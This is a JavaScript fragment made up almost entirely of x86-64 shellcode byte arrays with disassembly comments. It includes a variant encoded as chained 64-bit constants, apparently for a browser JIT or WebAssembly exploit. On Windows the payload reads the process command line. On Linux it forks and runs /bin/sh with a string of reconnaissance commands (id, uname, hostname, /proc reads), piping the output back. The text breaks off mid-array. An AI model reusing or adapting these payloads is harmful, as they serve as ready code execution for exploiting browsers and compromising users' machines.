let shellcode = [
    // ZF set if not a Windows system
    0x41, 0x8c, 0xec,                        // 00: MOV r12d, gs
    0x4d, 0x85, 0xe4,                        // 03: TEST r12, r12
    0x0f, 0x84, 0x3b, 0x00, 0x00, 0x00,      // 06: JZ :Label('Linux') => 0x0047
    // Windows shellcode
    0x49, 0x89, 0xc4,                        // 12: MOV r12, rax
    0x48, 0x31, 0xc9,                        // 15: XOR rcx, rcx
    0x65, 0x48, 0x8b, 0x41, 0x60,            // 18: MOV(rax, gs:[rcx+0x60])
    0x48, 0x8b, 0x40, 0x20,                  // 23: MOV rax, [rax + 32]
    0x66, 0x8b, 0x48, 0x70,                  // 27: MOV cx, [rax + 112]
    0x48, 0x8b, 0x40, 0x78,                  // 31: MOV rax, [rax + 120]
    // loop [0x0023]:
    0x44, 0x8a, 0x18,                        // 35: MOV r11b, [rax]
    0x45, 0x88, 0x1c, 0x24,                  // 38: MOV [r12], r11b
    0x48, 0xff, 0xc0,                        // 42: INC rax
    0x49, 0xff, 0xc4,                        // 45: INC r12
    0x48, 0xff, 0xc9,                        // 48: DEC rcx
    0x48, 0x85, 0xc9,                        // 51: TEST rcx, rcx
    0x0f, 0x85, 0xe7, 0xff, 0xff, 0xff,      // 54: JNZ :Label('loop') => 0x0023
    0x68, 0x00, 0x01, 0x00, 0x00,            // 60: PUSH 256
    0x58,                                    // 65: POP rax
    0xe9, 0xf3, 0x02, 0x00, 0x00,            // 66: JMP :Label('return') => 0x033a
    // Linux [0x0047]:
    0x49, 0x89, 0xc4,                        // 71: MOV r12, rax
    0x68, 0x2f, 0x00, 0x00, 0x2f,            // 74: PUSH 788529199
    0x31, 0xd2,                              // 79: XOR edx, edx
    0x31, 0xf6,                              // 81: XOR esi, esi
    0x48, 0x89, 0xe7,                        // 83: MOV rdi, rsp
    0xb8, 0x02, 0x00, 0x00, 0x00,            // 86: MOV eax, 2
    0x0f, 0x05,                              // 91: SYSCALL
    0x5f,                                    // 93: POP rdi
    0x48, 0xc1, 0xe8, 0x3f,                  // 94: SHR rax, 63
    0x85, 0xc0,                              // 98: TEST eax, eax
    0x4c, 0x89, 0xe0,                        // 100: MOV rax, r12
    0x0f, 0x85, 0x60, 0x02, 0x00, 0x00,      // 103: JNZ :Label('LinuxSandbox') => 0x02cd
    // LinuxForkExec [0x006d]:
    0x48, 0x89, 0xc3,                        // 109: MOV rbx, rax
    // pipe(link)
    0x6a, 0x00,                              // 112: PUSH 0
    0xb8, 0x16, 0x00, 0x00, 0x00,            // 114: MOV eax, 22
    0x48, 0x89, 0xe7,                        // 119: MOV rdi, rsp
    0x0f, 0x05,                              // 122: SYSCALL
    0x41, 0x59,                              // 124: POP r9
    0x45, 0x89, 0xc8,                        // 126: MOV r8d, r9d
    0x49, 0xc1, 0xe9, 0x20,                  // 129: SHR r9, 32
    0xb8, 0x39, 0x00, 0x00, 0x00,            // 133: MOV eax, 57
    0x0f, 0x05,                              // 138: SYSCALL
    0x48, 0x85, 0xc0,                        // 140: TEST rax, rax
    0x0f, 0x85, 0xfb, 0x01, 0x00, 0x00,      // 143: JNZ :Label('parent') => 0x0290
    // Fork Child
    // dup2(link[1], STDOUT_FILENO);
    0xb8, 0x21, 0x00, 0x00, 0x00,            // 149: MOV eax, 33
    0x4c, 0x89, 0xcf,                        // 154: MOV rdi, r9
    0xbe, 0x01, 0x00, 0x00, 0x00,            // 157: MOV esi, 1
    0x0f, 0x05,                              // 162: SYSCALL
    // close(link[0])
    0xb8, 0x03, 0x00, 0x00, 0x00,            // 164: MOV eax, 3
    0x4c, 0x89, 0xc7,                        // 169: MOV rdi, r8
    0x0f, 0x05,                              // 172: SYSCALL
    // close(link[1])
    0xb8, 0x03, 0x00, 0x00, 0x00,            // 174: MOV eax, 3
    0x4c, 0x89, 0xcf,                        // 179: MOV rdi, r9
    0x0f, 0x05,                              // 182: SYSCALL
    0x31, 0xc0,                              // 184: XOR eax, eax
    0x48, 0xc1, 0xe0, 0x20,                  // 186: SHL rax, 32
    0x48, 0x83, 0xc8, 0x00,                  // 190: OR rax, 0
    0x50,                                    // 194: PUSH rax
    0x31, 0xc0,                              // 195: XOR eax, eax
    0x48, 0xc1, 0xe0, 0x20,                  // 197: SHL rax, 32
    0x48, 0x83, 0xc8, 0x00,                  // 201: OR rax, 0
    0x50,                                    // 205: PUSH rax
    0xb8, 0x2f, 0x2f, 0x73, 0x68,            // 206: MOV eax, 1752379183
    0x48, 0xc1, 0xe0, 0x20,                  // 211: SHL rax, 32
    0x48, 0x0d, 0x2f, 0x62, 0x69, 0x6e,      // 215: OR rax, 1852400175
    0x50,                                    // 221: PUSH rax
    0x54,                                    // 222: PUSH rsp
    0x41, 0x58,                              // 223: POP r8
    0x31, 0xc0,                              // 225: XOR eax, eax
    0x48, 0xc1, 0xe0, 0x20,                  // 227: SHL rax, 32
    0x48, 0x83, 0xc8, 0x00,                  // 231: OR rax, 0
    0x50,                                    // 235: PUSH rax
    0x31, 0xc0,                              // 236: XOR eax, eax
    0x48, 0xc1, 0xe0, 0x20,                  // 238: SHL rax, 32
    0x48, 0x0d, 0x2d, 0x63, 0x00, 0x00,      // 242: OR rax, 25389
    0x50,                                    // 248: PUSH rax
    0x54,                                    // 249: PUSH rsp
    0x41, 0x59,                              // 250: POP r9
    0x31, 0xc0,                              // 252: XOR eax, eax
    0x48, 0xc1, 0xe0, 0x20,                  // 254: SHL rax, 32
    0x48, 0x83, 0xc8, 0x00,                  // 258: OR rax, 0
    0x50,                                    // 262: PUSH rax
    0x31, 0xc0,                              // 263: XOR eax, eax
    0x48, 0xc1, 0xe0, 0x20,                  // 265: SHL rax, 32
    0x48, 0x83, 0xc8, 0x00,                  // 269: OR rax, 0
    0x50,                                    // 273: PUSH rax
    0xb8, 0x20, 0x2d, 0x31, 0x3b,            // 274: MOV eax, 993078560
    0x48, 0xc1, 0xe0, 0x20,                  // 279: SHL rax, 32
    0x48, 0x0d, 0x68, 0x65, 0x61, 0x64,      // 283: OR rax, 1684104552
    0x50,                                    // 289: PUSH rax
    0xb8, 0x50, 0x20, 0x7c, 0x20,            // 290: MOV eax, 545005648
    0x48, 0xc1, 0xe0, 0x20,                  // 295: SHL rax, 32
    0x48, 0x0d, 0x2b, 0x27, 0x20, 0x24,      // 299: OR rax, 606086955
    0x50,                                    // 305: PUSH rax
    0xb8, 0x30, 0x2d, 0x39, 0x5d,            // 306: MOV eax, 1564028208
    0x48, 0xc1, 0xe0, 0x20,                  // 311: SHL rax, 32
    0x48, 0x0d, 0x7d, 0x5c, 0x2e, 0x5b,      // 315: OR rax, 1529764989
    0x50,                                    // 321: PUSH rax
    0xb8, 0x39, 0x5d, 0x7b, 0x34,            // 322: MOV eax, 880500025
    0x48, 0xc1, 0xe0, 0x20,                  // 327: SHL rax, 32
    0x48, 0x0d, 0x2e, 0x5b, 0x30, 0x2d,      // 331: OR rax, 758143790
    0x50,                                    // 337: PUSH rax
    0xb8, 0x5c, 0x2e, 0x30, 0x5c,            // 338: MOV eax, 1546661468
    0x48, 0xc1, 0xe0, 0x20,                  // 343: SHL rax, 32
    0x48, 0x0d, 0x5d, 0x7b, 0x33, 0x7d,      // 347: OR rax, 2100525917
    0x50,                                    // 353: PUSH rax
    0xb8, 0x5b, 0x30, 0x2d, 0x39,            // 354: MOV eax, 959262811
    0x48, 0xc1, 0xe0, 0x20,                  // 359: SHL rax, 32
    0x48, 0x0d, 0x45, 0x6f, 0x20, 0x27,      // 363: OR rax, 656437061
    0x50,                                    // 369: PUSH rax
    0xb8, 0x70, 0x20, 0x2d, 0x61,            // 370: MOV eax, 1630347376
    0x48, 0xc1, 0xe0, 0x20,                  // 375: SHL rax, 32
    0x48, 0x0d, 0x20, 0x67, 0x72, 0x65,      // 379: OR rax, 1701996320
    0x50,                                    // 385: PUSH rax
    0xb8, 0x20, 0x24, 0x50, 0x3b,            // 386: MOV eax, 995107872
    0x48, 0xc1, 0xe0, 0x20,                  // 391: SHL rax, 32
    0x48, 0x0d, 0x20, 0x2d, 0x6c, 0x61,      // 395: OR rax, 1634479392
    0x50,                                    // 401: PUSH rax
    0xb8, 0x3b, 0x20, 0x6c, 0x73,            // 402: MOV eax, 1936465979
    0x48, 0xc1, 0xe0, 0x20,                  // 407: SHL rax, 32
    0x48, 0x0d, 0x2f, 0x65, 0x78, 0x65,      // 411: OR rax, 1702389039
    0x50,                                    // 417: PUSH rax
    0xb8, 0x50, 0x50, 0x49, 0x44,            // 418: MOV eax, 1145655376
    0x48, 0xc1, 0xe0, 0x20,                  // 423: SHL rax, 32
    0x48, 0x0d, 0x6f, 0x63, 0x2f, 0x24,      // 427: OR rax, 607085423
    0x50,                                    // 433: PUSH rax
    0xb8, 0x3d, 0x2f, 0x70, 0x72,            // 434: MOV eax, 1919954749
    0x48, 0xc1, 0xe0, 0x20,                  // 439: SHL rax, 32
    0x48, 0x0d, 0x72, 0x74, 0x20, 0x50,      // 443: OR rax, 1344304242
    0x50,                                    // 449: PUSH rax
    0xb8, 0x65, 0x78, 0x70, 0x6f,            // 450: MOV eax, 1869641829
    0x48, 0xc1, 0xe0, 0x20,                  // 455: SHL rax, 32
    0x48, 0x0d, 0x68, 0x6f, 0x3b, 0x20,      // 459: OR rax, 540766056
    0x50,                                    // 465: PUSH rax
    0xb8, 0x3b, 0x20, 0x65, 0x63,            // 466: MOV eax, 1667571771
    0x48, 0xc1, 0xe0, 0x20,                  // 471: SHL rax, 32
    0x48, 0x0d, 0x6c, 0x69, 0x6e, 0x65,      // 475: OR rax, 1701734764
    0x50,                                    // 481: PUSH rax
    0xb8, 0x2f, 0x63, 0x6d, 0x64,            // 482: MOV eax, 1684890415
    0x48, 0xc1, 0xe0, 0x20,                  // 487: SHL rax, 32
    0x48, 0x0d, 0x50, 0x50, 0x49, 0x44,      // 491: OR rax, 1145655376
    0x50,                                    // 497: PUSH rax
    0xb8, 0x6f, 0x63, 0x2f, 0x24,            // 498: MOV eax, 607085423
    0x48, 0xc1, 0xe0, 0x20,                  // 503: SHL rax, 32
    0x48, 0x0d, 0x20, 0x2f, 0x70, 0x72,      // 507: OR rax, 1919954720
    0x50,                                    // 513: PUSH rax
    0xb8, 0x20, 0x63, 0x61, 0x74,            // 514: MOV eax, 1952539424
    0x48, 0xc1, 0xe0, 0x20,                  // 519: SHL rax, 32
    0x48, 0x0d, 0x69, 0x6d, 0x65, 0x3b,      // 523: OR rax, 996502889
    0x50,                                    // 529: PUSH rax
    0xb8, 0x2f, 0x75, 0x70, 0x74,            // 530: MOV eax, 1953527087
    0x48, 0xc1, 0xe0, 0x20,                  // 535: SHL rax, 32
    0x48, 0x0d, 0x70, 0x72, 0x6f, 0x63,      // 539: OR rax, 1668248176
    0x50,                                    // 545: PUSH rax
    0xb8, 0x61, 0x74, 0x20, 0x2f,            // 546: MOV eax, 790656097
    0x48, 0xc1, 0xe0, 0x20,                  // 551: SHL rax, 32
    0x48, 0x0d, 0x65, 0x3b, 0x20, 0x63,      // 555: OR rax, 1663056741
    0x50,                                    // 561: PUSH rax
    0xb8, 0x20, 0x64, 0x61, 0x74,            // 562: MOV eax, 1952539680
    0x48, 0xc1, 0xe0, 0x20,                  // 567: SHL rax, 32
    0x48, 0x0d, 0x20, 0x2d, 0x61, 0x3b,      // 571: OR rax, 996224288
    0x50,                                    // 577: PUSH rax
    0xb8, 0x6e, 0x61, 0x6d, 0x65,            // 578: MOV eax, 1701667182
    0x48, 0xc1, 0xe0, 0x20,                  // 583: SHL rax, 32
    0x48, 0x0d, 0x64, 0x3b, 0x20, 0x75,      // 587: OR rax, 1965046628
    0x50,                                    // 593: PUSH rax
    0xb8, 0x3b, 0x20, 0x70, 0x77,            // 594: MOV eax, 2003836987
    0x48, 0xc1, 0xe0, 0x20,                  // 599: SHL rax, 32
    0x48, 0x0d, 0x6e, 0x61, 0x6d, 0x65,      // 603: OR rax, 1701667182
    0x50,                                    // 609: PUSH rax
    0xb8, 0x68, 0x6f, 0x73, 0x74,            // 610: MOV eax, 1953722216
    0x48, 0xc1, 0xe0, 0x20,                  // 615: SHL rax, 32
    0x48, 0x0d, 0x69, 0x64, 0x3b, 0x20,      // 619: OR rax, 540763241
    0x50,                                    // 625: PUSH rax
    0x54,                                    // 626: PUSH rsp
    0x41, 0x5a,                              // 627: POP r10
    0x6a, 0x00,                              // 629: PUSH 0
    0x41, 0x52,                              // 631: PUSH r10
    0x41, 0x51,                              // 633: PUSH r9
    0x41, 0x50,                              // 635: PUSH r8
    0x54,                                    // 637: PUSH rsp
    0x41, 0x5a,                              // 638: POP r10
    0xb8, 0x3b, 0x00, 0x00, 0x00,            // 640: MOV eax, 59
    0x4c, 0x89, 0xd6,                        // 645: MOV rsi, r10
    0x48, 0x8b, 0x3e,                        // 648: MOV rdi, [rsi]
    0x48, 0x31, 0xd2,                        // 651: XOR rdx, rdx
    0x0f, 0x05,                              // 654: SYSCALL
    // parent [0x0290]:
    // Fork Parent
    // close(link[1])
    0xb8, 0x03, 0x00, 0x00, 0x00,            // 656: MOV eax, 3
    0x4c, 0x89, 0xcf,                        // 661: MOV rdi, r9
    0x0f, 0x05,                              // 664: SYSCALL
    0xba, 0x00, 0x10, 0x00, 0x00,            // 666: MOV edx, 4096
    // read [0x029f]:
    // read(link[0], rbx, 4096)
    0x48, 0x31, 0xc0,                        // 671: XOR rax, rax
    0x4c, 0x89, 0xc7,                        // 674: MOV rdi, r8
    0x48, 0x89, 0xde,                        // 677: MOV rsi, rbx
    0x0f, 0x05,                              // 680: SYSCALL
    0x48, 0x01, 0xc3,                        // 682: ADD rbx, rax
    0x29, 0xc2,                              // 685: SUB edx, eax
    0x48, 0x85, 0xc0,                        // 687: TEST rax, rax
    0x0f, 0x85, 0xe7, 0xff, 0xff, 0xff,      // 690: JNZ :Label('read') => 0x029f
    // close(link[0])
    0xb8, 0x03, 0x00, 0x00, 0x00,            // 696: MOV eax, 3
    0x4c, 0x89, 0xc7,                        // 701: MOV rdi, r8
    0x0f, 0x05,                              // 704: SYSCALL
    0x68, 0x80, 0x00, 0x00, 0x00,            // 706: PUSH 128
    0x58,                                    // 711: POP rax
    0xe9, 0x6d, 0x00, 0x00, 0x00,            // 712: JMP :Label('return') => 0x033a
    // LinuxSandbox [0x02cd]:
    0x48, 0x89, 0xc7,                        // 717: MOV rdi, rax
    0xb8, 0x66, 0x00, 0x00, 0x00,            // 720: MOV eax, 102
    0x0f, 0x05,                              // 725: SYSCALL
    0x48, 0x89, 0xfb,                        // 727: MOV rbx, rdi
    0xb9, 0x0a, 0x00, 0x00, 0x00,            // 730: MOV ecx, 10
    // convert_loop [0x02df]:
    0x31, 0xd2,                              // 735: XOR edx, edx
    0xf7, 0xf1,                              // 737: DIV ecx
    0x83, 0xc2, 0x30,                        // 739: ADD edx, 48
    0x89, 0x13,                              // 742: MOV [rbx], edx
    0x48, 0xff, 0xc3,                        // 744: INC rbx
    0x85, 0xc0,                              // 747: TEST eax, eax
    0x0f, 0x85, 0xec, 0xff, 0xff, 0xff,      // 749: JNZ :Label('convert_loop') => 0x02df
    0x48, 0xff, 0xcb,                        // 755: DEC rbx
    0x48, 0x89, 0xda,                        // 758: MOV rdx, rbx
    0x48, 0x89, 0xf9,                        // 761: MOV rcx, rdi
    // reverse_loop [0x02fc]:
    0x8a, 0x07,                              // 764: MOV al, [rdi]
    0x8a, 0x1a,                              // 766: MOV bl, [rdx]
    0x88, 0x1f,                              // 768: MOV [rdi], bl
    0x88, 0x02,                              // 770: MOV [rdx], al
    0x48, 0xff, 0xc7,                        // 772: INC rdi
    0x48, 0xff, 0xca,                        // 775: DEC rdx
    0x48, 0x39, 0xd7,                        // 778: CMP rdi, rdx
    0x0f, 0x8c, 0xe9, 0xff, 0xff, 0xff,      // 781: JMP :Label('reverse_loop') => 0x02fc
    0x48, 0x01, 0xd7,                        // 787: ADD rdi, rdx
    0x48, 0x29, 0xcf,                        // 790: SUB rdi, rcx
    0x48, 0xff, 0xc7,                        // 793: INC rdi
    0x31, 0xc9,                              // 796: XOR ecx, ecx
    0x89, 0x0f,                              // 798: MOV [rdi], ecx
    0x48, 0xff, 0xc7,                        // 800: INC rdi
    0xb8, 0x3f, 0x00, 0x00, 0x00,            // 803: MOV eax, 63
    0x0f, 0x05,                              // 808: SYSCALL
    0x31, 0xc0,                              // 810: XOR eax, eax
    0xb8, 0x80, 0x01, 0x00, 0x00,            // 812: MOV eax, 384
    0x48, 0x01, 0xc7,                        // 817: ADD rdi, rax
    0x48, 0x89, 0xf8,                        // 820: MOV rax, rdi
    0x6a, 0x40,                              // 823: PUSH 64
    0x58,                                    // 825: POP rax
    // return [0x033a]:
    0xc3,                                    // 826: RET
];

xxshellcode = [
    0x48, 0x89, 0xc7,                        // 00: MOV rdi, rax
0xb8, 0x66, 0x00, 0x00, 0x00,            // 03: MOV eax, 102
0x0f, 0x05,                              // 08: SYSCALL
0x48, 0x89, 0xfb,                        // 10: MOV rbx, rdi
0xb9, 0x0a, 0x00, 0x00, 0x00,            // 13: MOV ecx, 10
// convert_loop [0x0012]:
0x31, 0xd2,                              // 18: XOR edx, edx
0xf7, 0xf1,                              // 20: DIV ecx
0x83, 0xc2, 0x30,                        // 22: ADD edx, 48
0x89, 0x13,                              // 25: MOV [rbx], edx
0x48, 0xff, 0xc3,                        // 27: INC rbx
0x85, 0xc0,                              // 30: TEST eax, eax
0x0f, 0x85, 0xec, 0xff, 0xff, 0xff,      // 32: JNZ :Label('convert_loop') => 0x0012
0x48, 0xff, 0xcb,                        // 38: DEC rbx
0x48, 0x89, 0xda,                        // 41: MOV rdx, rbx
0x48, 0x89, 0xf9,                        // 44: MOV rcx, rdi
// reverse_loop [0x002f]:
0x8a, 0x07,                              // 47: MOV al, [rdi]
0x8a, 0x1a,                              // 49: MOV bl, [rdx]
0x88, 0x1f,                              // 51: MOV [rdi], bl
0x88, 0x02,                              // 53: MOV [rdx], al
0x48, 0xff, 0xc7,                        // 55: INC rdi
0x48, 0xff, 0xca,                        // 58: DEC rdx
0x48, 0x39, 0xd7,                        // 61: CMP rdi, rdx
0x0f, 0x8c, 0xe9, 0xff, 0xff, 0xff,      // 64: JMP :Label('reverse_loop') => 0x002f
0x48, 0x01, 0xd7,                        // 70: ADD rdi, rdx
0x48, 0x29, 0xcf,                        // 73: SUB rdi, rcx
0x48, 0xff, 0xc7,                        // 76: INC rdi
0x31, 0xc9,                              // 79: XOR ecx, ecx
0x89, 0x0f,                              // 81: MOV [rdi], ecx
0x48, 0xff, 0xc7,                        // 83: INC rdi
0xb8, 0x3f, 0x00, 0x00, 0x00,            // 86: MOV eax, 63
0x0f, 0x05,                              // 91: SYSCALL
0x31, 0xc0,                              // 93: XOR eax, eax
0xb8, 0x80, 0x01, 0x00, 0x00,            // 95: MOV eax, 384
0x48, 0x01, 0xc7,                        // 100: ADD rdi, rax
0x48, 0x89, 0xf8,                        // 103: MOV rax, rdi
// return [0x006a]:
0xc3,                                    // 106: RET

];
      
let wasmShellcode = [
    0x05eb909090909090n, // 00[0x0000]: SLED 0x06
    0x01010108ebec8c41n, // 01[0x000d]: MOV r12d, gs
    0x01010208ebe4854dn, // 02[0x001a]: TEST r12, r12
    0x05eb000000d7840fn, // 03[0x0027]: JZ :Linux => 0x0104
    // Windows shellcode
    0x01010408ebc48949n, // 04[0x0034]: MOV r12, rax
    0x01010508ebc93148n, // 05[0x0041]: XOR rcx, rcx
    0x0606eb60418b4865n, // 06[0x004e]: MOV(rax, gs:[rcx+0x60])
    0x010707eb20408b48n, // 07[0x005b]: MOV rax, [rax + 32]
    0x010807eb70488b66n, // 08[0x0068]: MOV cx, [rax + 112]
    0x010907eb78408b48n, // 09[0x0075]: MOV rax, [rax + 120]
    // loop [0x0082]:
    0x01010a08eb188a44n, // 10[0x0082]: MOV r11b, [rax]
    0x010b07eb241c8845n, // 11[0x008f]: MOV [r12], r11b
    0x01010c08ebc0ff48n, // 12[0x009c]: INC rax
    0x01010d08ebc4ff49n, // 13[0x00a9]: INC r12
    0x01010e08ebc9ff48n, // 14[0x00b6]: DEC rcx
    0x01010f08ebc98548n, // 15[0x00c3]: TEST rcx, rcx
    0x05ebffffffac850fn, // 16[0x00d0]: JNZ :loop => 0x0082
    0x1106eb0000010068n, // 17[0x00dd]: PUSH 256
    0x01010101120aeb58n, // 18[0x00ea]: POP rax
    0x1306eb000007f4e9n, // 19[0x00f7]: JMP :return => 0x08f0
    // Linux [0x0104]:
    0x01011408ebc48949n, // 20[0x0104]: MOV r12, rax
    0x1506eb2f00002f68n, // 21[0x0111]: PUSH 788529199
    0x0101011609ebd231n, // 22[0x011e]: XOR edx, edx
    0x0101011709ebf631n, // 23[0x012b]: XOR esi, esi
    0x01011808ebe78948n, // 24[0x0138]: MOV rdi, rsp
    0x1906eb00000002b8n, // 25[0x0145]: MOV eax, 2
    0x0101011a09eb050fn, // 26[0x0152]: SYSCALL
    0x010101011b0aeb5fn, // 27[0x015f]: POP rdi
    0x011c07eb3fe8c148n, // 28[0x016c]: SHR rax, 63
    0x0101011d09ebc085n, // 29[0x0179]: TEST eax, eax
    0x01011e08ebe0894cn, // 30[0x0186]: MOV rax, r12
    0x05eb00000590850fn, // 31[0x0193]: JNZ :LinuxSandbox => 0x0729
    // LinuxForkExec [0x01a0]:
    0x01012008ebc38948n, // 32[0x01a0]: MOV rbx, rax
    // pipe(link)
    0x0101012109eb006an, // 33[0x01ad]: PUSH 0
    0x2206eb00000016b8n, // 34[0x01ba]: MOV eax, 22
    0x01012308ebe78948n, // 35[0x01c7]: MOV rdi, rsp
    0x0101012409eb050fn, // 36[0x01d4]: SYSCALL
    0x0101012509eb5941n, // 37[0x01e1]: POP r9
    0x01012608ebc88945n, // 38[0x01ee]: MOV r8d, r9d
    0x012707eb20e9c149n, // 39[0x01fb]: SHR r9, 32
    0x2806eb00000039b8n, // 40[0x0208]: MOV eax, 57
    0x0101012909eb050fn, // 41[0x0215]: SYSCALL
    0x01012a08ebc08548n, // 42[0x0222]: TEST rax, rax
    0x05eb0000040a850fn, // 43[0x022f]: JNZ :parent => 0x063f
    // Fork Child
    // dup2(link[1], STDOUT_FILENO);
    0x2c06eb00000021b8n, // 44[0x023c]: MOV eax, 33
    0x01012d08ebcf894cn, // 45[0x0249]: MOV rdi, r9
    0x2e06eb00000001ben, // 46[0x0256]: MOV esi, 1
    0x0101012f09eb050fn, // 47[0x0263]: SYSCALL
    // close(link[0])
    0x3006eb00000003b8n, // 48[0x0270]: MOV eax, 3
    0x01013108ebc7894cn, // 49[0x027d]: MOV rdi, r8
    0x0101013209eb050fn, // 50[0x028a]: SYSCALL
    // close(link[1])
    0x3306eb00000003b8n, // 51[0x0297]: MOV eax, 3
    0x01013408ebcf894cn, // 52[0x02a4]: MOV rdi, r9
    0x0101013509eb050fn, // 53[0x02b1]: SYSCALL
    0x0101013609ebc031n, // 54[0x02be]: XOR eax, eax
    0x013707eb20e0c148n, // 55[0x02cb]: SHL rax, 32
    0x013807eb00c88348n, // 56[0x02d8]: OR rax, 0
    0x01010101390aeb50n, // 57[0x02e5]: PUSH rax
    0x0101013a09ebc031n, // 58[0x02f2]: XOR eax, eax
    0x013b07eb20e0c148n, // 59[0x02ff]: SHL rax, 32
    0x013c07eb00c88348n, // 60[0x030c]: OR rax, 0
    0x010101013d0aeb50n, // 61[0x0319]: PUSH rax
    0x3e06eb68732f2fb8n, // 62[0x0326]: MOV eax, 1752379183
    0x013f07eb20e0c148n, // 63[0x0333]: SHL rax, 32
    0x05eb6e69622f0d48n, // 64[0x0340]: OR rax, 1852400175
    0x01010101410aeb50n, // 65[0x034d]: PUSH rax
    0x01010101420aeb54n, // 66[0x035a]: PUSH rsp
    0x0101014309eb5841n, // 67[0x0367]: POP r8
    0x0101014409ebc031n, // 68[0x0374]: XOR eax, eax
    0x014507eb20e0c148n, // 69[0x0381]: SHL rax, 32
    0x014607eb00c88348n, // 70[0x038e]: OR rax, 0
    0x01010101470aeb50n, // 71[0x039b]: PUSH rax
    0x0101014809ebc031n, // 72[0x03a8]: XOR eax, eax
    0x014907eb20e0c148n, // 73[0x03b5]: SHL rax, 32
    0x05eb0000632d0d48n, // 74[0x03c2]: OR rax, 25389
    0x010101014b0aeb50n, // 75[0x03cf]: PUSH rax
    0x010101014c0aeb54n, // 76[0x03dc]: PUSH rsp
    0x0101014d09eb5941n, // 77[0x03e9]: POP r9
    0x0101014e09ebc031n, // 78[0x03f6]: XOR eax, eax
    0x014f07eb20e0c148n, // 79[0x0403]: SHL rax, 32
    0x015007eb00c88348n, // 80[0x0410]: OR rax, 0
    0x01010101510aeb50n, // 81[0x041d]: PUSH rax
    0x0101015209ebc031n, // 82[0x042a]: XOR eax, eax
    0x015307eb20e0c148n, // 83[0x0437]: SHL rax, 32
    0x05eb3b656d690d48n, // 84[0x0444]: OR rax, 996502889
    0x01010101550aeb50n, // 85[0x0451]: PUSH rax
    0x5606eb7470752fb8n, // 86[0x045e]: MOV eax, 1953527087
    0x015707eb20e0c148n, // 87[0x046b]: SHL rax, 32
    0x05eb636f72700d48n, // 88[0x0478]: OR rax, 1668248176
    0x01010101590aeb50n, // 89[0x0485]: PUSH rax
    0x5a06eb2f207461b8n, // 90[0x0492]: MOV eax, 790656097
    0x015b07eb20e0c148n, // 91[0x049f]: SHL rax, 32
    0x05eb63203b650d48n, // 92[0x04ac]: OR rax, 1663056741
    0x010101015d0aeb50n, // 93[0x04b9]: PUSH rax
    0x5e06eb74616420b8n, // 94[0x04c6]: MOV eax, 1952539680
    0x015f07eb20e0c148n, // 95[0x04d3]: SHL rax, 32
    0x05eb3b612d200d48n, // 96[0x04e0]: OR rax, 996224288
    0x01010101610aeb50n, // 97[0x04ed]: PUSH rax
    0x6206eb656d616eb8n, // 98[0x04fa]: MOV eax, 1701667182
    0x016307eb20e0c148n, // 99[0x0507]: SHL rax, 32
    0x05eb75203b640d48n, // 100[0x0514]: OR rax, 1965046628
    0x01010101650aeb50n, // 101[0x0521]: PUSH rax
    0x6606eb7770203bb8n, // 102[0x052e]: MOV eax, 2003836987
    0x016707eb20e0c148n, // 103[0x053b]: SHL rax, 32
    0x05eb656d616e0d48n, // 104[0x0548]: OR rax, 1701667182
    0x01010101690aeb50n, // 105[0x0555]: PUSH rax
    0x6a06eb74736f68b8n, // 106[0x0562]: MOV eax, 1953722216
    0x016b07eb20e0c148n, // 107[0x056f]: SHL rax, 32
    0x05eb203b64690d48n, // 108[0x057c]: OR rax, 540763241
    0x010101016d0aeb50n, // 109[0x0589]: PUSH rax
    0x010101016e0aeb54n, // 110[0x0596]: PUSH rsp
    0x0101016f09eb5a41n, // 111[0x05a3]: POP r10
    0x0101017009eb006an, // 112[0x05b0]: PUSH 0
    0x0101017109eb5241n, // 113[0x05bd]: PUSH r10
    0x0101017209eb5141n, // 114[0x05ca]: PUSH r9
    0x0101017309eb5041n, // 115[0x05d7]: PUSH r8
    0x01010101740aeb54n, // 116[0x05e4]: PUSH rsp
    0x0101017509eb5a41n, // 117[0x05f1]: POP r10
    0x7606eb0000003bb8n, // 118[0x05fe]: MOV eax, 59
    0x01017708ebd6894cn, // 119[0x060b]: MOV rsi, r10
    0x01017808eb3e8b48n, // 120[0x0618]: MOV rdi, [rsi]
    0x01017908ebd23148n, // 121[0x0625]: XOR rdx, rdx
    0x0101017a09eb050fn, // 122[0x0632]: SYSCALL
    // parent [0x063f]:
    // Fork Parent
    // close(link[1])
    0x7b06eb00000003b8n, // 123[0x063f]: MOV eax, 3
    0x01017c08ebcf894cn, // 124[0x064c]: MOV rdi, r9
    0x0101017d09eb050fn, // 125[0x0659]: SYSCALL
    0x7e06eb00001000ban, // 126[0x0666]: MOV edx, 4096
    // read [0x0673]:
    // read(link[0], rbx, 4096)
    0x01017f08ebc03148n, // 127[0x0673]: XOR rax, rax
    0x01018008ebc7894cn, // 128[0x0680]: MOV rdi, r8
    0x01018108ebde8948n, // 129[0x068d]: MOV rsi, rbx
    0x0101018209eb050fn, // 130[0x069a]: SYSCALL
    0x01018308ebc30148n, // 131[0x06a7]: ADD rbx, rax
    0x0101018409ebc229n, // 132[0x06b4]: SUB edx, eax
    0x01018508ebc08548n, // 133[0x06c1]: TEST rax, rax
    0x05ebffffff9f850fn, // 134[0x06ce]: JNZ :read => 0x0673
    // close(link[0])
    0x8706eb00000003b8n, // 135[0x06db]: MOV eax, 3
    0x01018808ebc7894cn, // 136[0x06e8]: MOV rdi, r8
    0x0101018909eb050fn, // 137[0x06f5]: SYSCALL
    0x8a06eb0000008068n, // 138[0x0702]: PUSH 128
    0x010101018b0aeb58n, // 139[0x070f]: POP rax
    0x8c06eb000001cfe9n, // 140[0x071c]: JMP :return => 0x08f0
    // LinuxSandbox [0x0729]:
    0x01018d08ebc78948n, // 141[0x0729]: MOV rdi, rax
    0x8e06eb00000066b8n, // 142[0x0736]: MOV eax, 102
    0x0101018f09eb050fn, // 143[0x0743]: SYSCALL
    0x01019008ebfb8948n, // 144[0x0750]: MOV rbx, rdi
    0x9106eb0000000ab9n, // 145[0x075d]: MOV ecx, 10
    // convert_loop [0x076a]:
    0x0101019209ebd231n, // 146[0x076a]: XOR edx, edx
    0x0101019309ebf1f7n, // 147[0x0777]: DIV ecx
    0x01019408eb30c283n, // 148[0x0784]: ADD edx, 48
    0x0101019509eb1389n, // 149[0x0791]: MOV [rbx], edx
    0x01019608ebc3ff48n, // 150[0x079e]: INC rbx
    0x0101019709ebc085n, // 151[0x07ab]: TEST eax, eax
    0x01010101980aeb90n, // 152[0x07b8]: NOP
    0x01010101990aeb90n, // 153[0x07c5]: NOP
    0x05ebffffff92850fn, // 154[0x07d2]: JNZ :convert_loop => 0x076a
    0x01019b08ebcbff48n, // 155[0x07df]: DEC rbx
